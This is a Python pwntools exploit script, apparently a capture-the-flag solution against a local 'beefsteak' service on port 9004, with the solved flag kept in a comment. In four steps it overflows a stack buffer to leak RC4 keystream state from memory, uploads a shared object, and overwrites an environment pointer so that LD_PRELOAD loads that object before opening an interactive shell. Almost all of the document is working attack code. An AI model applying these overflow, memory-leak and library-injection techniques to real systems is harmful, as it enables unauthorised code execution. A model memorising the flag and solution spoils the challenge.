from pwn import *

PORT = 9004

# Flag was This_is_beefsteak_flag_112334455661!!!

def decode_rc4(target):
    state_str = '8204ee9e0a2c0d4eb8605141858e3861fcd44c39402180bb896912a8f8599cf0469d753417bfd28c7a37e470071c23c3c46ab642a23e1677b99bdf22923294bd4abe365fce5b47d7ecb57bb0b38d9a5d314f8b3da148f6971a74432453ea0c2e26d61563ab68ff02307dd3d071cbe0134db46edb494454a052fdb7ac8a935a5850ca7635cd2ad85ca3c2fb104586569629e8f49f0683ccc96401a6f38fbc952d1dafa7a9eb663b1418d95ec7e26d7ca408d1e1c599ed67aa2779ae0e6c0b91da62dd6f3f7f7ef709dc1bcfd5ba981fc157c8defab119e972fe3a812b6b03f1e5b2f96584e64bc6202f73258855f52811ef87adf2'
    state_str += '00'
    state_str += '78333ca590050fe31ee7c0'
    state_str = state_str.decode('hex')

    state = []
    for c in state_str:
        state.append(ord(c))

    t = ''
    i = 0
    j = 0
    for k in range(len(target)):
    	i = (i + 1) % 256
    	j = (j + state[i]) % 256
    	state[i], state[j] = state[j], state[i]
    	t += chr(state[(state[i] + state[j]) % 256])

    ret = ''
    for i in range(len(target)):
        ret += chr(ord(t[i]) ^ ord(target[i]))
    return ret

def next(payload, wait=None):
	if wait:
		str = p.recvuntil(wait)
	else:
		str = p.recv()
	p.send(payload)
	print str + payload

print "Please input step:"

step = raw_input()[0]

if step == '1':
    p = remote('localhost', PORT)

    payload = ''
    payload += '\00' * 24
    payload += 'a' * (0x00007fffffffe9e8 - 0x00007fffffffe8d0 - len(payload))
    payload += p64(0x602160)
    payload += '\n'

    next(payload, 'food?\n')
    str = p.recvuntil('that!')
    start = 44
    index = str.index(' terminated')
    log.success('read %d bytes' % len(str[start:index]))
    log.success(str[start:index].encode('hex'))
    print str
elif step == '2':
    p = remote('localhost', PORT)

    payload = ''
    payload += '\00' * 24
    payload += 'a' * (0x00007fffffffe9e8 - 0x00007fffffffe8d0 - len(payload))
    payload += p64(0x602160 + 245)
    payload += '\n'

    next(payload, 'food?\n')
    str = p.recvuntil('that!')
    start = 44
    index = str.index(' terminated')
    log.success('read %d bytes' % len(str[start:index]))
    log.success(str[start:index].encode('hex'))
    print str
elif step == '3':
    p = remote('localhost', PORT)

    want = '\x62\x31\xaa\x85\xbd\xbf\x9f\xf3\x8a\x02\x0c\x75\xac\x23\xab\xe4\x82\xc5\x25\x7a\xef\xbd\xc9\x61'

    payload = decode_rc4(want)
    payload += '\n'

    next(payload, 'food?\n')

    f = open('message.so', 'rb')
    next(f.read(), 'message\n')
    f.close()
    p.close()
elif step == '4':
    p = remote('localhost', PORT)

    want = '\x62\x31\xaa\x85\xbd\xbf\x9f\xf3\x8a\x02\x0c\x75\xac\x23\xab\xe4\x82\xc5\x25\x7a\xef\xbd\xc9\x61' # 24
    want += '\x00'*8 # 32
    want += 'LD_PRELOAD=./message'
    want += '\x00'

    payload = decode_rc4(want)
    payload += '\x00'
    payload += 'a' * (0x00007fffffffe9f8 - 0x00007fffffffe8d0 - len(payload))
    payload += p64(0x602120 + 32)
    payload += '\n'

    next(payload, 'food?\n')
    p.interactive()
